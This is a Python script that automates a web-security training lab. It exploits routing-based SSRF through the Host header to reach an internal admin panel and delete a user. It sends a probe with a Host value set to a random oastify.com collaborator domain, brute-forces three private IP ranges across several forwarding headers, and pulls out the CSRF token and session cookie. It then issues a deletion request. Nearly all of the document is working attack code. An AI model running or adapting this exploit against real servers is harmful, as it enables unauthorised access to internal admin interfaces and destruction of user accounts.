#!/usr/bin/env python3
# === Fully Automated Routing-based SSRF → Admin Takeover → Delete carlos ===

import requests
import re
import sys
import logging
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from time import sleep
from tqdm import tqdm
import random
import string
import threading

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Default lab URL
DEFAULT_LAB_URL = "https://0abb00050463294b82671a3a00f200dd.web-security-academy.net/"

# Internal IP range to probe (focus on 192.168.0.0/24 as per lab)
IP_RANGES = [
    ("192.168.0.{}", "192.168.0.0/24"),
    ("10.0.0.{}", "10.0.0.0/24"),
    ("172.16.0.{}", "172.16.0.0/24")  # Limited to /24 for efficiency
]

# SSRF headers to test
SSRF_HEADERS = [
    "Host",
    "X-Forwarded-Host",
    "X-Host",
    "X-Original-Host",
    "Origin",
    "X-Forwarded-For"
]

# Ports to append to Host header
PORTS = ["", ":80", ":8080"]

# Semaphore to limit concurrent requests
REQUEST_SEMAPHORE = threading.Semaphore(5)

def banner():
    logging.info("\n=== 🚪 Advanced SSRF via Host Header (Routing-based) ===")
    logging.info(">>> Shadow Junior 😈 | GANGA Autonomous Mode")
    logging.info(">>> Goal: Probe internal IPs → Access /admin → Delete carlos\n")

def get_lab_url():
    try:
        url = input(f"🔗 Enter the full lab URL (default: {DEFAULT_LAB_URL}): ").strip() or DEFAULT_LAB_URL
        if not url.startswith("http"):
            raise ValueError("Invalid URL format.")
        return url.rstrip('/')
    except Exception as e:
        logging.error(f"Input Error: {e}")
        sys.exit(1)

def generate_collaborator_payload():
    # Simulate a Collaborator-like payload
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{random_str}.oastify.com"

def test_collaborator(session, base_url):
    payload = generate_collaborator_payload()
    logging.info(f"[*] Testing SSRF with simulated Collaborator payload: {payload}")
    headers = {"Host": payload}
    try:
        with REQUEST_SEMAPHORE:
            r = session.get(base_url, headers=headers, allow_redirects=False, timeout=5)
        logging.info(f"[+] Sent Collaborator payload. Status: {r.status_code}")
        return payload
    except Exception as e:
        logging.error(f"[!] Collaborator test failed: {e}")
        return None

def probe_ip(ip, base_url, session, results, header_name="Host", port=""):
    headers = {header_name: f"{ip}{port}"}
    try:
        with REQUEST_SEMAPHORE:
            r = session.get(base_url, headers=headers, allow_redirects=False, timeout=5)
        if r.status_code == 302:
            location = r.headers.get("Location", "").lower()
            logging.info(f"[*] 302 detected for {header_name}: {ip}{port}, Location: {location}")
            if "admin" in location:
                logging.info(f"[✓] Admin interface found via {header_name}: {ip}{port}")
                results.append((ip, header_name, port))
    except Exception as e:
        logging.debug(f"[DEBUG] Request failed for {ip}{port}: {e}")

def probe_internal_ips(base_url, session):
    logging.info("[*] Probing internal IPs across multiple ranges...")
    results = []
    for ip_template, range_name in IP_RANGES:
        logging.info(f"[*] Scanning {range_name}...")
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for i in tqdm(range(256), desc=f"Probing {range_name}", unit="IP"):
                for header in SSRF_HEADERS:
                    for port in PORTS:
                        ip = ip_template.format(i)
                        futures.append(executor.submit(probe_ip, ip, base_url, session, results, header, port))
            for future in futures:
                future.result()  # Ensure all tasks complete
        if results:
            break
    if results:
        return results[0]  # Return first successful (IP, header, port) tuple
    logging.error("[✗] No admin redirect detected. Check logs for 302 responses or try manual Burp confirmation.")
    sys.exit(1)

def get_admin_data(session, admin_url, host_ip, host_header, port):
    headers = {host_header: f"{host_ip}{port}"}
    retries = 3
    for attempt in range(retries):
        try:
            with REQUEST_SEMAPHORE:
                r = session.get(admin_url, headers=headers, timeout=10)
            if r.status_code != 200:
                logging.error(f"[!] Failed to access /admin: Status {r.status_code}")
                if attempt < retries - 1:
                    logging.info(f"[*] Retrying... ({attempt + 1}/{retries})")
                    sleep(2 ** attempt)
                    continue
                sys.exit(1)
            # Extract session cookie
            session_cookie = session.cookies.get("session")
            if not session_cookie:
                logging.error("[!] Session cookie not found in /admin response.")
                sys.exit(1)
            # Extract CSRF token
            match = re.search(r'name=["\']csrf["\'] value=["\'](.+?)["\']', r.text, re.IGNORECASE)
            if not match:
                logging.error("[!] CSRF token not found in /admin page.")
                sys.exit(1)
            csrf_token = match.group(1)
            logging.info(f"[+] Session cookie: {session_cookie}")
            logging.info(f"[+] CSRF token: {csrf_token}")
            return session_cookie, csrf_token
        except Exception as e:
            logging.error(f"[!] Failed to access /admin: {e}")
            if attempt < retries - 1:
                logging.info(f"[*] Retrying... ({attempt + 1}/{retries})")
                sleep(2 ** attempt)
            else:
                sys.exit(1)

def delete_carlos(session, base_url, host_ip, host_header, port, csrf_token):
    url = f"{base_url}/admin/delete?csrf={quote(csrf_token)}&username=carlos"
    headers = {host_header: f"{host_ip}{port}"}
    retries = 3
    for attempt in range(retries):
        try:
            with REQUEST_SEMAPHORE:
                r = session.post(url, headers=headers, timeout=10)
            if "Congratulations" in r.text or r.status_code in [200, 302]:
                logging.info("[💥] User carlos deleted successfully. Lab solved!")
                return True
            else:
                logging.error("[✗] Deletion failed. Response snippet:")
                logging.error(r.text[:300])
                if attempt < retries - 1:
                    logging.info(f"[*] Retrying... ({attempt + 1}/{retries})")
                    sleep(2 ** attempt)
                else:
                    return False
        except Exception as e:
            logging.error(f"[!] Deletion error: {e}")
            if attempt < retries - 1:
                logging.info(f"[*] Retrying... ({attempt + 1}/{retries})")
                sleep(2 ** attempt)
            else:
                return False
    return False

def main():
    banner()
    base_url = get_lab_url()
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    # Configure connection pool
    adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
    session.mount('https://', adapter)

    # Test Collaborator for SSRF verification
    collaborator_payload = test_collaborator(session, base_url)
    if collaborator_payload:
        logging.info("[*] Check Burp Collaborator for interactions with %s", collaborator_payload)

    # Probe for admin interface
    host_ip, host_header, port = probe_internal_ips(base_url, session)
    admin_url = f"{base_url}/admin"

    # Get session cookie and CSRF token
    session_cookie, csrf_token = get_admin_data(session, admin_url, host_ip, host_header, port)

    # Delete carlos
    if delete_carlos(session, base_url, host_ip, host_header, port, csrf_token):
        logging.info("[✅] Lab successfully solved!")
    else:
        logging.error("[!] Failed to solve lab. Check logs and try manual Burp confirmation.")

if __name__ == "__main__":
    main()
